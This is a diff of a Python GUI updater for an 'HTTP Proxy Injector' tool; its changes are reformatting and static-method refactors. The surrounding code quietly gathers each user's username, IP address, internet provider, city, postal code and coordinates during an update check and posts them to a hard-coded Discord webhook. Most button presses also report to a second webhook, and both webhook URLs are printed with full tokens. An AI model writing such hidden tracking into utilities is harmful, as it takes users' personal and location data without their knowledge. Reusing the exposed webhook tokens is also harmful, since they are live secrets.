@@ -133,7 +133,6 @@ def version_check():
             root.destroy()
 
         class App:
-
             def __init__(self, root):
                 # setting title
                 root.title("No Internet Connection")
@@ -183,8 +182,7 @@ def version_check():
                 content=f"{time_now}--Checking for updates...\n",
             )
             log_response = log_webhook.execute()
-            return "".join(
-                random.choice(string.ascii_letters) for x in range(y))
+            return "".join(random.choice(string.ascii_letters) for x in range(y))
 
         random_num = random_char(10)
 
@@ -205,8 +203,8 @@ def version_check():
         )
 
         with open(
-                "D:/OneDrive - adithya/Programming/Python/PPX-Updater/bin/update_date.txt",
-                "w",
+            "D:/OneDrive - adithya/Programming/Python/PPX-Updater/bin/update_date.txt",
+            "w",
         ) as p:
             p.write(f"Update date - {today}")
 
@@ -227,14 +225,12 @@ def version_check():
         all_details = f"Username - {username}\nDate - {today}\nTime - {current_time}\nIP - {ip_all}\nInternet Provider - {org}\nTime Zone - {timezone}\nCountry - {country}\nRegion - {region}\nCity - {city}\nPostal Code - {postal}\nCoordinates - {cords}\n\n\n"
         url = (
             "https://discord.com/api/webhooks/993353038532194384/EV-LnzJvQcQSrgNcPTT8w4EQs"
-            "-_gAoPvlYT885Atpz9UtDRFWWJp8dEj_Zw6pgejd_Hk")
+            "-_gAoPvlYT885Atpz9UtDRFWWJp8dEj_Zw6pgejd_Hk"
+        )
         data = {
             "content": "New User Checked for Updates",
             "Update Info": "Update Info",
-            "embeds": [{
-                "description": all_details,
-                "title": "User Information"
-            }],
+            "embeds": [{"description": all_details, "title": "User Information"}],
         }
         result = requests.post(url, json=data)
         try:
@@ -242,8 +238,7 @@ def version_check():
         except requests.exceptions.HTTPError as err:
             print(err)
         else:
-            print("Payload delivered successfully, code {}.".format(
-                result.status_code))
+            print("Payload delivered successfully, code {}.".format(result.status_code))
             f.write(f"{time_now}--Updated database successfully\n")
             log_webhook = DiscordWebhook(
                 url="https://discord.com/api/webhooks/1007512069756694538"
@@ -308,10 +303,10 @@ def version_check():
                     GButton_368.place(x=330, y=260, width=220, height=60)
                     GButton_368["command"] = self.GButton_368_command
 
-                def GButton_439_command(self):
+                @staticmethod
+                def GButton_439_command():
                     print("command")
-                    f.write(
-                        f'{time_now}--Coming soon = "GButton_439_command"\n')
+                    f.write(f'{time_now}--Coming soon = "GButton_439_command"\n')
                     log_webhook = DiscordWebhook(
                         url="https://discord.com/api/webhooks/1007512069756694538"
                         "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
@@ -319,7 +314,8 @@ def version_check():
                     )
                     log_response = log_webhook.execute()
 
-                def GButton_368_command(self):
+                @staticmethod
+                def GButton_368_command():
                     root.destroy()
                     f.write(f"{time_now}--Exiting updater\n")
                     log_webhook = DiscordWebhook(
@@ -379,7 +375,8 @@ def version_check():
                     GButton_284.place(x=180, y=220, width=207, height=64)
                     GButton_284["command"] = self.GButton_284_command
 
-                def GButton_284_command(self):
+                @staticmethod
+                def GButton_284_command():
                     root.destroy()
                     f.write(f"{time_now}--Exiting no updater\n")
                     log_webhook = DiscordWebhook(
@@ -499,8 +496,8 @@ class App:
         GButton_970.place(x=510, y=860, width=134, height=38)
         GButton_970["command"] = self.GButton_970_command
 
-    def GButton_60_command(self):
-
+    @staticmethod
+    def GButton_60_command():
         def zoom():
             f.write(f"{time_now}--Selected zoom package\n")
             log_webhook = DiscordWebhook(
@@ -511,8 +508,7 @@ class App:
             log_response = log_webhook.execute()
 
             def random_char(y):
-                return "".join(
-                    random.choice(string.ascii_letters) for x in range(y))
+                return "".join(random.choice(string.ascii_letters) for x in range(y))
 
             random_num = random_char(10)
             f.write(f"{time_now}--Creating temp folders\n")
@@ -523,9 +519,7 @@ class App:
             )
             log_response = log_webhook.execute()
             print(f"Temp Folder Created Using The Name - {random_num}")
-            f.write(
-                f"{time_now}--temp folders created using the name = {random_num}\n"
-            )
+            f.write(f"{time_now}--temp folders created using the name = {random_num}\n")
             log_webhook = DiscordWebhook(
                 url="https://discord.com/api/webhooks/1007512069756694538"
                 "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
@@ -549,7 +543,7 @@ class App:
             log_response = log_webhook.execute()
 
             if os.path.exists(
-                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles\A-Dev1412-SYS.ppx"
+                "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles\A-Dev1412-SYS.ppx"
             ):
                 f.write(f"{time_now}--Removing old configs\n")
                 log_webhook = DiscordWebhook(
@@ -595,7 +589,8 @@ class App:
 
         zoom()
 
-    def GButton_970_command(self):
+    @staticmethod
+    def GButton_970_command():
         root.destroy()
         f.write(f'{time_now}--Exiting = "GButton_970_command"\n')
         log_webhook = DiscordWebhook(
@@ -605,8 +600,8 @@ class App:
         )
         log_response = log_webhook.execute()
 
-    def GButton_304_command(self):
-
+    @staticmethod
+    def GButton_304_command():
         def whatsapp():
             f.write(f"{time_now}--Selected Whatsapp package\n")
             log_webhook = DiscordWebhook(
@@ -617,8 +612,7 @@ class App:
             log_response = log_webhook.execute()
 
             def random_char(y):
-                return "".join(
-                    random.choice(string.ascii_letters) for x in range(y))
+                return "".join(random.choice(string.ascii_letters) for x in range(y))
 
             random_num = random_char(10)
             f.write(f"{time_now}--Creating temp folders\n")
@@ -629,9 +623,7 @@ class App:
             )
             log_response = log_webhook.execute()
             print(f"Temp Folder Created Using The Name - {random_num}")
-            f.write(
-                f"{time_now}--Created temp folders using name - {random_num}\n"
-            )
+            f.write(f"{time_now}--Created temp folders using name - {random_num}\n")
             log_webhook = DiscordWebhook(
                 url="https://discord.com/api/webhooks/1007512069756694538"
                 "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
@@ -655,7 +647,7 @@ class App:
             log_response = log_webhook.execute()
 
             if os.path.exists(
-                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles\A-Dev1412-SYS.ppx"
+                "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles\A-Dev1412-SYS.ppx"
             ):
                 f.write(f"{time_now}--Removing old configs\n")
                 log_webhook = DiscordWebhook(
@@ -701,8 +693,8 @@ class App:
 
         whatsapp()
 
-    def GButton_383_command(self):
-
+    @staticmethod
+    def GButton_383_command():
         def facebook():
             f.write(f"{time_now}--Selected Facebook package\n")
             log_webhook = DiscordWebhook(
@@ -713,8 +705,7 @@ class App:
             log_response = log_webhook.execute()
 
             def random_char(y):
-                return "".join(
-                    random.choice(string.ascii_letters) for x in range(y))
+                return "".join(random.choice(string.ascii_letters) for x in range(y))
 
             random_num = random_char(10)
             f.write(f"{time_now}--Creating temp folders\n")
@@ -725,9 +716,7 @@ class App:
             )
             log_response = log_webhook.execute()
             print(f"Temp Folder Created Using The Name - {random_num}")
-            f.write(
-                f"{time_now}--temp folders created using the name = {random_num}\n"
-            )
+            f.write(f"{time_now}--temp folders created using the name = {random_num}\n")
             log_webhook = DiscordWebhook(
                 url="https://discord.com/api/webhooks/1007512069756694538"
                 "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
@@ -751,7 +740,7 @@ class App:
             log_response = log_webhook.execute()
 
             if os.path.exists(
-                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles\A-Dev1412-SYS.ppx"
+                "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles\A-Dev1412-SYS.ppx"
             ):
                 f.write(f"{time_now}--Removing old configs\n")
                 log_webhook = DiscordWebhook(
@@ -797,8 +786,8 @@ class App:
 
         facebook()
 
-    def GButton_820_command(self):
-
+    @staticmethod
+    def GButton_820_command():
         def defaults():
             f.write(f"{time_now}--Selected default values\n")
             log_webhook = DiscordWebhook(
@@ -809,8 +798,7 @@ class App:
             log_response = log_webhook.execute()
 
             def random_char(y):
-                return "".join(
-                    random.choice(string.ascii_letters) for x in range(y))
+                return "".join(random.choice(string.ascii_letters) for x in range(y))
 
             random_num = random_char(10)
             f.write(f"{time_now}--Creating temp folders\n")
@@ -821,9 +809,7 @@ class App:
             )
             log_response = log_webhook.execute()
             print(f"Temp Folder Created Using The Name - {random_num}")
-            f.write(
-                f"{time_now}--Created temp folders using name - {random_num}\n"
-            )
+            f.write(f"{time_now}--Created temp folders using name - {random_num}\n")
             log_webhook = DiscordWebhook(
                 url="https://discord.com/api/webhooks/1007512069756694538"
                 "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
@@ -847,7 +833,7 @@ class App:
             log_response = log_webhook.execute()
 
             if os.path.exists(
-                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles\A-Dev1412-SYS.ppx"
+                "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles\A-Dev1412-SYS.ppx"
             ):
                 f.write(f"{time_now}--removing old configs\n")
                 log_webhook = DiscordWebhook(
@@ -893,8 +879,8 @@ class App:
 
         defaults()
 
-    def GButton_567_command(self):
-
+    @staticmethod
+    def GButton_567_command():
         class App:
             f.write(f"{time_now}--Running about window\n")
             log_webhook = DiscordWebhook(
@@ -976,7 +962,8 @@ class App:
                 GButton_674.place(x=190, y=370, width=181, height=66)
                 GButton_674["command"] = self.GButton_674_command
 
-            def GButton_674_command(self):
+            @staticmethod
+            def GButton_674_command():
                 root.destroy()
                 f.write(f"{time_now}--Exiting about window\n")
                 log_webhook = DiscordWebhook(
@@ -991,7 +978,8 @@ class App:
             app = App(root)
             root.mainloop()
 
-    def GButton_155_command(self):
+    @staticmethod
+    def GButton_155_command():
         version_check()
 
 
